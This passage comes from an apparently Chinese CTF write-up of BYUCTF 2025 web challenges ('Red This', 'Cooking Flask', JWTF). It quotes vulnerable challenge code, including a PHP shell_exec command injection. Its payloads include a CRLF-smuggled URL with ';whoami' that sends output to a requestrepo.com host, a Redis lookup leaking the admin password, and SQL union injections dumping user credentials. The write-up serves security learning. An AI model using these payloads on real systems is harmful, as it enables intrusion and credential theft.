</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Please insert the ID parameter in the URL&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#Internal secret functionality
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$secret</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;secret&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;nslookup &#39;</span> <span class=o>.</span> <span class=nv>$secret</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>可以RCE，但是没有回显，我们外带试试能否成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://156.238.233.93/categories/test%20HTTP/1.1%0d%0aHost:%20156.238.233.93%0d%0a%0d%0aGET%20/categories.php%3fsecret=4fz7yove.requestrepo.com;whoami
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/byuctf2025/QQ20250517-122357.jpg width=1695 height=696 loading=lazy alt=1></p><p><img src=/p/byuctf2025/QQ20250517-123143.jpg width=1080 height=696 loading=lazy alt=1></p><p>复现完之后思路就很清晰了，只需要加个http头即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://wonka.chal.cyberjousting.com/name/test%20HTTP/1.1%0d%0aa:admin%0d%0aHost:%20wonka.chal.cyberjousting.com%0d%0a%0d%0aGET%20/name/test
</span></span></code></pre></td></tr></table></div></div><h2 id=red-this>Red This</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>### IMPORTS ###</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>flask</span><span class=o>,</span> <span class=nn>redis</span><span class=o>,</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### INITIALIZATIONS ###</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;redthis-redis&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### HELPER FUNCTIONS ###</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getData</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>db</span> <span class=o>=</span> <span class=n>redis</span><span class=o>.</span><span class=n>Redis</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=n>HOST</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>6379</span><span class=p>,</span> <span class=n>decode_responses</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getAdminOptions</span><span class=p>(</span><span class=n>username</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>adminOptions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>username</span> <span class=o>!=</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>username</span> <span class=o>==</span> <span class=s2>&#34;admin&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span> <span class=o>=</span> <span class=n>redis</span><span class=o>.</span><span class=n>Redis</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=n>HOST</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>6379</span><span class=p>,</span> <span class=n>decode_responses</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>adminOptions</span> <span class=o>=</span> <span class=n>db</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;admin_options&#34;</span><span class=p>,</span> <span class=s2>&#34;$&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>adminOptions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### ROUTES ###</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>root</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>adminOptions</span> <span class=o>=</span> <span class=n>getAdminOptions</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>adminOptions</span><span class=o>=</span><span class=n>adminOptions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># get quote </span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/get_quote&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getQuote</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>person</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;famous_person&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>quote</span> <span class=o>=</span> <span class=p>[</span><span class=n>person</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;flag&#34;</span> <span class=ow>in</span> <span class=n>person</span> <span class=ow>and</span> <span class=n>username</span> <span class=o>!=</span> <span class=s2>&#34;admin&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>quote</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;Nope&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>        <span class=n>quote</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>getData</span><span class=p>(</span><span class=n>person</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>adminOptions</span> <span class=o>=</span> <span class=n>getAdminOptions</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>adminOptions</span><span class=o>=</span><span class=n>adminOptions</span><span class=p>,</span> <span class=n>quote</span><span class=o>=</span><span class=n>quote</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># return register page </span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>,</span> <span class=n>error</span><span class=o>=</span><span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;username&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## error check</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/register?error=Missing+fields&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## if username already exists return error</span>
</span></span><span class=line><span class=cl>    <span class=n>isUser</span> <span class=o>=</span> <span class=n>getData</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>isUser</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/register?error=Username+already+taken&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># insert new user and password</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span> <span class=o>=</span> <span class=n>redis</span><span class=o>.</span><span class=n>Redis</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=n>HOST</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>6379</span><span class=p>,</span> <span class=n>decode_responses</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># db.set(username, &#34;User&#34;) # nah, we don&#39;t want to let you write to the db :)</span>
</span></span><span class=line><span class=cl>        <span class=n>passwordKey</span> <span class=o>=</span> <span class=n>username</span> <span class=o>+</span> <span class=s2>&#34;_password&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># db.set(passwordKey, password) # nah, we don&#39;t want to let you write to the db :)</span>
</span></span><span class=line><span class=cl>        <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>username</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>     <span class=c1># return register page </span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>error</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;login.html&#39;</span><span class=p>,</span> <span class=n>error</span><span class=o>=</span><span class=n>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;username&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>## error check</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/login?error=Missing+fields&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># check username and password</span>
</span></span><span class=line><span class=cl>    <span class=n>dbUser</span> <span class=o>=</span> <span class=n>getData</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dbPassword</span> <span class=o>=</span> <span class=n>getData</span><span class=p>(</span><span class=n>username</span> <span class=o>+</span> <span class=s2>&#34;_password&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>dbUser</span> <span class=o>==</span> <span class=s2>&#34;User&#34;</span> <span class=ow>and</span> <span class=n>dbPassword</span> <span class=o>==</span> <span class=n>password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>username</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/login?error=Bad+login&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1337</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>threaded</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>稍微看了一下代码，核心逻辑还是越权，但是这个代码逻辑的判断是有问题的</p><p><img src=/p/byuctf2025/QQ20250518-110355.jpg width=1089 height=557 loading=lazy alt=1></p><p><code>getData</code>直接return了，查询的时候又写个and，<code>dbPassword = getData(username + "_password")</code>这里得知怎么查询<code>admin</code>的密码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/get_quote</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>redthis.chal.cyberjousting.com</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>famous_person=admin_password
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/get_quote</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>redthis.chal.cyberjousting.com</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aClO5g._S3TLBUJbAcEqasx_XMZq9xK3EM</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>famous_person=flag_7392ilj8i32
</span></span></code></pre></td></tr></table></div></div><h2 id=cooking-flask>Cooking Flask</h2><p>经过测试发现是Sql注入，只不过这里列数比较多</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cooking.chal.cyberjousting.com/search?recipe_name=&amp;description=&amp;tags=&#39; ) union select 1,2,3,4 from user--+
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/byuctf2025/QQ20250518-103511.jpg width=1200 height=612 loading=lazy alt=1></p><p>判断出来是八列之后，不然列名为<code>int</code>，我们挨个换就好了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cooking.chal.cyberjousting.com/search?recipe_name=&amp;description=&amp;tags=&#39; ) union select 1,username,&#39;2023-01-01&#39;,3,password,password,&#39;[]&#39;,1 from user--+
</span></span></code></pre></td></tr></table></div></div><p>调试的时间很长</p><h2 id=jwtf>JWTF</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># imports</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>make_response</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>jwt</span><span class=o>,</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># initialize flask</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>FLAG</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;flag.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>APP_SECRET</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ADMIN_SECRET</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;ADMIN_SECRET: </span><span class=si>{</span><span class=n>ADMIN_SECRET</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># JRL - JWT Revocation List</span>
</span></span><span class=line><span class=cl><span class=n>jrl</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=n>jwt</span><span class=o>.</span><span class=n>encode</span><span class=p>({</span><span class=s2>&#34;admin&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span> <span class=s2>&#34;uid&#34;</span><span class=p>:</span> <span class=s1>&#39;1337&#39;</span><span class=p>},</span> <span class=n>APP_SECRET</span><span class=p>,</span> <span class=n>algorithm</span><span class=o>=</span><span class=s2>&#34;HS256&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># main</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
